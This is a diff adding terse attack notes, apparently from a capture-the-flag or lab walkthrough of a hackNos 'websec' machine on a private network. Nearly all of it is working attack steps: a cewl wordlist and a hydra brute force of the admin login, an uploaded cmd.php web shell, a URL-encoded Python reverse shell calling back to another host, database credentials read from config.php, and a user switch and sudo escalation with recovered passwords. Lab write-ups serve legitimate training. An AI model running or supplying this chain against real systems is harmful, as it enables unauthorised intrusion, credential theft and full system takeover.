@@ -1,0 +1,39 @@
+http://10.0.0.144/devil/
+http://10.0.0.144/websec/admin
+
+cewl -d 3 -w websec-wordlist.txt -e http://10.0.0.144/websec/
+contact@hacknos.com
+
+
+hydra -l "contact@hacknos.com" -P websec.txt 10.0.0.144 http-form-post '/websec/admin:username=^USER^&password=^PASS^:F=Wrong'
+
+login: contact@hacknos.com   password: Securityx
+
+# uploaded cmd.php from www/cmd.php
+http://10.0.0.251/websec/assets/cmd.php?cmd=ls
+
+http://10.0.0.251/websec/assets/cmd.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.0.0.148%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
+
+
+/var/www/html/devil/hackNosff/cli/manage.php
+/var/www/html/websec/src/core/views/admin/db_backup.php
+/var/www/html/websec/src/core/classes/db_backup.php
+
+/etc/mysql/conf.d/
+etc/mysql/mariadb.conf.d/
+
+
+cat /var/www/html/websec/config.php
+'host' => 'localhost',
+'user' => 'cmsu',
+'pass' => 'securityx',
+'name' => 'cms',
+mysql -h localhost -u cmsu -p
+# same as getting a backup on the web app
+
+
+su - blackdevil
+Security@x@
+
+
+sudo su
